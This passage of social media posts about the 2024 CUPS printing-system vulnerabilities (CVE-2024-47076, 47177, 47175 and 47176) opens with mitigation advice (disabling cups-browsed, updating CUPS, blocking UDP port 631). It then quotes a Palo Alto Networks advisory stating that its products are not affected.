There is no patch right now. Disable and remove cups-browserd (you probably do not need it anyway). Update CUPS as updates become available. Stop UDP traffic on Port 631.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #vulnerability #cve

##
screaminggoat at 2024-09-26T21:06:29.772Z ##

Palo Alto Networks advisory: CVE-2024-47076 Informational: No Impact of CUPS Vulnerabilities on Palo Alto Networks Products
The Palo Alto Networks Product Security Assurance team has evaluated CVE-2024-47076, CVE-2024-47177, CVE-2024-47175, and CVE-2024-47176 in the Common UNIX Printing System (CUPS) as they relate to our products. Based on current information, Palo Alto Networks products and cloud services do not contain affected CUPS-related software packages and are not impacted by these issues.

Note: PAN on top of the social media scene or have people giving them a heads up.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #PaloAltoNetworks #vulnerability #cve
